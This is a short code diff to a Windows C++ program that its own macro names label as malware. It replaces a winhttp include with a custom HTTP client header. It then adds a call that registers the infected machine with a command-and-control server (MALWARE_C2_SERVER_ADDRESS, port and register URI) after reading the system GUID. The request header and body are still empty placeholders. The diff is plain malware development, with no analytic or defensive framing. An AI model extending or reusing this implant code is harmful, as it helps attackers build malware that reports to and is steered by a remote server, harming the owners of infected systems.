@@ -4,7 +4,7 @@
 #include <winbase.h>
 
 #include "config.h" 
-#include "winhttp.h"
+#include "httpClient.h"
 
 int wmain(int argc, wchar_t **argv, wchar_t **envp)
 {
@@ -34,6 +34,8 @@ int wmain(int argc, wchar_t **argv, wchar_t **envp)
         // LOG(L"GUID: %s\n", systemGuidValue);
         return -1;
     }
-    
+    std::wstring requestHeader; // build post request header
+    std::wstring requestBody;   // build post request body i.e. json
+    std::wstring result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_REGISTER_URI, requestHeader, requestBody, false);
     return 0;
 }
